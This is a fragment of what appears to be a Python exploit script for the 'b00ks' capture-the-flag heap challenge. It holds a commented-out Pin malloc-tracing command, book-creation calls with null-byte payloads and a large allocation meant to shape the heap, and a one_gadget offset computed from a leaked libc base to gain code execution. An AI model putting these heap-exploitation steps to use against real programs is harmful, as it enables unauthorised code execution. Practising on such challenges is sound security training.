...
#x = "/home/ubuntu/pin/pin-3.10-97971-gc5e41af74-gcc-linux/pin -t /home/ubuntu/pin/pin-3.10-97971-gc5e41af74-gcc-linux/source/tools/ManualExamples/obj-intel64/malloctrace.so -- ./b00ks makefile w_malloctrace.makefile.copy"
#io=process(x.split(" "))
...
createname("\x00"*32)
createbook(128,"\x00",32,"\x00")
createbook(0x21000,"\x00",0x21000,"\x00")
...
one_gadget=libc_base+0x4526a #0x4f2c5 0x10a38c 0x4f322
